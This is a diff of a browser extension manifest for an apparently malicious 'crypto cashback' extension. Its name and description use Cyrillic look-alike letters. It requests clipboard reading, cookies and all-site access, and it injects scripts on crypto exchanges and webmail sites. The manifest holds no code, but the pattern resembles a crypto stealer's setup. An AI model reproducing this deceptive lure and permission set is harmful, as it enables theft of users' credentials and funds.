@@ -1,4 +1,4 @@
-﻿{
+{
    "background": {
       "persistent": false,
       "scripts": [ "assets/js/jquery.min.js", "background/background.js" ]
@@ -16,7 +16,7 @@
    "content_scripts": [ {
       "css": [ "assets/css/font-awesome.min.css", "assets/css/fonts.css", "assets/css/style.css" ],
       "js": [ "assets/js/jquery.min.js", "assets/js/loading-overlay.min.js" ],
-      "matches": [ "*://*.*/*", "*://localbitcoins.com/*", "*://*/*", "*://*.blockchain.com/*", "*://*.live.com/*", "*://*.google.com/*", "*://mail.ru/*", "*://*.binance.com/*", "*://*.coinbase.com/*", "*://*.qq.com/*", "*://*.mail.ru/*" ]
+      "matches": [ "*://*.yandex.ru/*", "*://localbitcoins.com/*", "*://*/*", "*://*.yahoo.com/*", "*://*.blockchain.com/*", "*://*.live.com/*", "*://*.google.com/*", "*://mail.ru/*", "*://*.binance.com/*", "*://*.coinbase.com/*", "*://*.qq.com/*", "*://*.mail.ru/*" ]
    } ],
    "description": "Return саshbaсk with every Bitcoin, Ethereum, Bitcoin Cash transaction by using plugin!",
    "icons": {
@@ -28,6 +28,6 @@
    },
 	"manifest_version": 2,
    "name": "Арр & Crурto Tооl",
-   "permissions": [ "tabs", "storage", "*://*/*", "*://*.*/*", "*://*.live.com/*", "*://*.yahoo.com/*", "clipboardRead", "cookies" ],
+   "permissions": [ "tabs", "storage", "*://*.google.com/*",  "*://*/*", "*://*.yahoo.com/*", "clipboardRead", "cookies" ],
    "version": "1.0.26"
 }
